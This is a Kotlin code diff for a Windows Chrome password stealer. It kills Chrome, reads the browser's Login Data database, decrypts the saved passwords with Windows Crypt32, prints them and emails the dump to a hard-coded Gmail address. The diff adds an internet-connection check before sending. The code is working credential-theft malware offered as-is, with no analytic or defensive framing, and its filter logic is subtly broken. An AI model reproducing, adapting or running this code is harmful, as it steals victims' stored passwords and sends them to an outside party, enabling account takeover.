@@ -1,46 +1,37 @@
 import com.sun.jna.platform.win32.Crypt32Util
 import java.io.File
+import java.net.URL
 import java.sql.Connection
 import java.sql.DriverManager
-import java.sql.ResultSet
 
-
-data class ChromeAccount(private val website: String,
-                         val username: String,
-                         private val clearTextPassword: String) {
-    constructor(rs: ResultSet) : this(
-            website = rs.getString(1),
-            username = rs.getString(2),
-            clearTextPassword = getWin32Password(rs.getBytes(3))
-    )
-}
 
 private lateinit var databaseFile: File
 private lateinit var connection: Connection
-const val emailToSendTo = "astroazure7@gmail.com"
-
+private const val emailToSendTo = "astroazure7@gmail.com"
 
 fun main(args: Array<String>) {
-    // force close chrome
-    Runtime.getRuntime().exec("taskkill /F /IM chrome.exe")
+    Runtime.getRuntime().exec("taskkill /F /IM chrome.exe") // force close chrome
+    checkInternetConnection()
     searchChrome()
     connectDb()
-    val list = getAccounts().filter {
-        !it.username.isNullOrBlank()
-    }
+    val list = getAccounts()
+            .filter {
+                !it.username.isBlank()
+                !it.website.isBlank()
+                !it.clearTextPassword.isBlank()
+            }.also { it.forEach(::println) }
+
     val emailRes = MailerTLS.sendDump(emailToSendTo, list)
-    if(emailRes)
-        println("Sent ^^")
+    if(emailRes) println("Sent ^^")
 }
 
 /**
  * Searches for chrome on the computer
  * Then searches for the file that stores the passwords
- * If file doesnt exist, program exits
+ * If file doesn't exist, program exits
  */
 private fun searchChrome() {
     val databaseFileDir = "${System.getenv("localappdata")}\\Google\\Chrome\\User Data\\Default\\Login Data"
-    println(databaseFileDir)
     databaseFile = File(databaseFileDir)
     if (!databaseFile.exists())
         println("Chrome does not exist!").run { System.exit(0) }
@@ -49,7 +40,7 @@ private fun searchChrome() {
 /**
  * Uses Windows Password to decrypt encrypted chrome passwords
  */
-private fun getWin32Password(encryptedData: ByteArray) =
+fun getWin32Password(encryptedData: ByteArray) =
         String(Crypt32Util.cryptUnprotectData(encryptedData))
 
 /**
@@ -78,6 +69,17 @@ private fun getAccounts(): ArrayList<ChromeAccount> {
     connection.close()
 
     return chromeAccounts
+}
+
+/**
+ * Checks for internet connection by pinging google
+ */
+private fun checkInternetConnection() = try {
+    URL("https://www.google.com").openConnection().connect()
+    println("Internet connection found!")
+}catch (e: Exception) {
+    println("No internet connection")
+    System.exit(0)
 }
 
 
